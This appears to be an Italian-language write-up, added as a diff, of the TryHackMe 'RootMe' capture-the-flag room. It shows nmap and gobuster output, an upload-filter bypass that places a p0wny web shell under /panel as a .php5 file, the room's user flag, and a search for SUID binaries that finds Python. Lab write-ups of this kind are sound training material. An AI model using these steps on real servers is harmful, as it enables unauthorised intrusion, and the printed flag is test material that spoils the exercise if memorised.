@@ -1,0 +1,74 @@
+# ROOT ME / TryHackMe
+
+# PING  10.10.59.242
+
+# SCANSIONE NMAP con il comando: nmap -sC -sV 10.10.50.242
+
+---------------------------------------------------------------
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 21:46 CET
+Nmap scan report for 10.10.59.242
+Host is up (0.068s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HackIT - Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+------------------------------------------------------------
+
+# GOBUSTER cerchiamo ulteriori subdomain con il comando: gobuster dir -u http://10.10.59.242 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,js -e -t 50
+
+----------------------------------------------------------------------------------------------------
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.59.242
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              txt,php,js
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/02/07 21:50:26 Starting gobuster in directory enumeration mode
+===============================================================
+http://10.10.59.242/uploads              (Status: 301) [Size: 314] [--> http://10.10.59.242/uploads/]
+http://10.10.59.242/index.php            (Status: 200) [Size: 616]                                   
+http://10.10.59.242/css                  (Status: 301) [Size: 310] [--> http://10.10.59.242/css/]    
+http://10.10.59.242/js                   (Status: 301) [Size: 309] [--> http://10.10.59.242/js/]     
+http://10.10.59.242/panel                (Status: 301) [Size: 312] [--> http://10.10.59.242/panel/] 
+-----------------------------------------------------------------------------------------------------
+
+# CERCARE VULNERABILITA` APACHE con il comando: searchsploit apache
+
+-------------------------------------------------------------------
+Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                                     | linux/local/46676.php
+Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                          | linux/remote/34.pl
+-------------------------------------------------------------------
+
+# GET A SHELL scaricare p0wny shell https://github.com/flozz/p0wny-shell e caricarlo su http://10.10.59.242/panel rinominando il file in php5. bastera` aprirla e otterremo una reverse shell!
+ 
+# USER FLAG
+ 
+ cd /var/www/ e cat user.txt
+ --------------------
+ THM{y0u_g0t_a_sh3ll}
+ --------------------
+ 
+ Task tryhackme: find / type f -user root -perm -4000 2>/dev/null
+ ----------------
+ /usr/bin/python
+ ---------------
+ 
